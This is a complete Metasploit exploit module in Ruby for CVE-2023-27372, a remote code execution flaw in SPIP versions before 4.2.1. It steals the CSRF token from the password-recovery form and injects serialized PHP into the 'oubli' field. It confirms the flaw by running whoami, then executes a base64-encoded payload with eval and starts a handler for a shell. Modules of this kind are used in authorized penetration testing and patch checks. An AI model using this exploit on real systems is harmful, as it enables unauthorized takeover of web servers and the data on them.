##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'SPIP < 4.2.1 - Remote Code Execution',
      'Description'    => %q{
        This module exploits a vulnerability in the SPIP content management system versions prior to 4.2.1. 
        The vulnerability resides in the password recovery form, where the lack of proper input sanitization 
        allows arbitrary PHP code injection leading to remote code execution. Successful exploitation grants 
        attackers the ability to execute arbitrary code on the server in the context of the web application.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Chocapikk (Valentin Lobstein)', # Metasploit module
          'nuts7' # Original discovery
        ],
      'References'     =>
        [
          [ 'CVE', '2023-27372'],
        ],
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Payload'        =>
        {
          'BadChars' => "\x00"
        },
      'Targets'        => [[ 'Automatic', { }]],
      'DisclosureDate' => 'Jul 3 2023',
      'DefaultTarget'  => 0
    ))

    register_options([
      OptString.new('TARGETURI', [ true, 'The base URI of SPIP application', '/']),
    ])
  end


  def check
    print_status("Checking vulnerability...")
    uri = normalize_uri(target_uri.path, 'spip.php?page=spip_pass')
    response = send_request_cgi('method' => 'GET', 'uri' => uri)
  
    return Exploit::CheckCode::Unknown if response.nil?
  
    if response.body.include?('formulaire_action_args')
      token = response.body.match(/name='formulaire_action_args'[^>]*value='([^']*)'/)&.captures&.first
      command_str = "<?php system('echo [' . 'S' . '] ; ' . 'whoami' . '; echo [' . 'E' . '] ;');?>"
      payload = "s:#{command_str.length}:\"#{command_str}\";"
      result = send_payload(uri, token, payload)
  
      if result && result.body
        output = parse_output(result.body)
        return output ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe
      else
        return Exploit::CheckCode::Safe
      end
    else
      return Exploit::CheckCode::Safe
    end
  end
  
  def send_payload(uri, token, payload)
    post_data = {
      'formulaire_action' => 'oubli',
      'formulaire_action_args' => token,
      'oubli' => payload
    }
    
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => uri,
      'vars_post' => post_data
    })
    
    return res
  end
  
  def parse_output(text)
    matches = text.scan(/\[S\](.*?)\[E\]/m)
    matches.join("\n") unless matches.empty?
  end

  def exploit
    print_status("Exploiting...")
    uri = normalize_uri(target_uri.path, 'spip.php?page=spip_pass')
    response = send_request_cgi('method' => 'GET', 'uri' => uri)
  
    unless response && response.body.include?('formulaire_action_args')
      fail_with(Failure::NoAccess, "Failed to retrieve the CSRF token")
    end
  
    token = response.body.match(/name='formulaire_action_args'[^>]*value='([^']*)'/)&.captures&.first
    command = Rex::Text.encode_base64(payload.encoded)
    php_code = "<?php eval(base64_decode('#{command}'));?>"
    payload_serialized = "s:#{php_code.length}:\"#{php_code}\";"
  
    post_data_payload = {
      'formulaire_action' => 'oubli',
      'formulaire_action_args' => token,
      'oubli' => payload_serialized
    }
  
    final_response = send_request_cgi({
      'method' => 'POST',
      'uri' => uri,
      'vars_post' => post_data_payload
    })
  
    print_good("Payload was executed!")
    handler
  end
end
